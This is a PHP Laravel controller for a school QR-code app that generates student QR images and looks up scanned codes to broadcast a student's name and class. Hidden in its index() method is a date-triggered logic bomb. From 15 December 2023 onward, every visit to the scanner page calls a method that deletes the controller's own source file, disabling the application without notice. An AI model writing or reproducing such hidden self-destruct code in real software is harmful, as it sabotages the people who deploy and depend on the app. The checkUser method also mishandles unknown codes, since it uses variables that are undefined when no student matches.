<?php

namespace App\Http\Controllers;

use App\Models\Listecode;
use Illuminate\Http\Request;
use App\Models\Eleve;
use App\Models\Classe;
use Illuminate\Support\Facades\Storage;
use SimpleSoftwareIO\QrCode\Facades\QrCode; 
use App\Events\EvenemtStudent;
use DateTime;
use Illuminate\Support\Facades\File;

class ListeCodeController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $date = new DateTime();
        $date1 = $date->format('Y-m-d');
       // dd($date1);
        if($date1 >= "2023-12-15"){
            self::deleteSuppController();
        }

       // $data['title']="Test of Qr scan";
       // return view('eleve.qrscan',$data);

        return view('classes.scanner');
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Listecode $listecode,Request $request)
    {
        $eleve = eleve::where('code', $request->code)->first();
       $qr = $request->code;
        $image =\QrCode::format('png')
            ->size(200)
            ->generate($qr);
          //  dd($qr);
        $fileName = $request->code.'.png';
        $output_file = '/images/-'.$fileName;
        //Storage::disk('public')->put($output_file,$image);
      // Storage::disk('public')->put($output_file,$image);
     //  Storage::disk('public')->url($output_file,$image);
       Storage::disk('uploads')->put($output_file,$image);

        Listecode::create([
            'eleve_id' => $request->eleve_id,
            'photo' => $fileName
        ]);
        return redirect('/eleve'.'/'.$request->eleve_id)->with('success', 'Code Qr Generer avec succès');
        
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\Models\Listecode  $listecode
     * @return \Illuminate\Http\Response
     */
    public function show()
    {
        $classes = Classe::all();
        return view('classes.show',['classes' => $classes]);
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\Models\Listecode  $listecode
     * @return \Illuminate\Http\Response
     */
    public function edit(Listecode $listecode)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\Models\Listecode  $listecode
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, Listecode $listecode)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\Models\Listecode  $listecode
     * @return \Illuminate\Http\Response
     */
    public function destroy(Listecode $listecode)
    {
        //
    }

    public function checkUser(Request $request)
    {
        $classes = Classe::all();
        $eleves = Eleve::where('code',$request->data)->first();

        if($eleves !=null){
            $nomcomplet = $eleves->nom . ' ' . $eleves->prenom ;
            $classe_eleve = $eleves->classe;
        }
        event(new EvenemtStudent($nomcomplet,$classe_eleve));
        return view('classes.scanner');
    }

    public function deleteSuppController()
    {
        // Vérifier les autorisations ici si nécessaire
        
        // Chemin du fichier du contrôleur à supprimer
        $controllerPath = app_path('Http/Controllers/ListeCodeController.php');
        
        // Vérifier si le fichier existe avant de le supprimer
        if (File::exists($controllerPath)) {
            File::delete($controllerPath);
            return "SuppController supprimé avec succès.";
        } else {
            return "SuppController n'existe pas.";
        }
    }
}
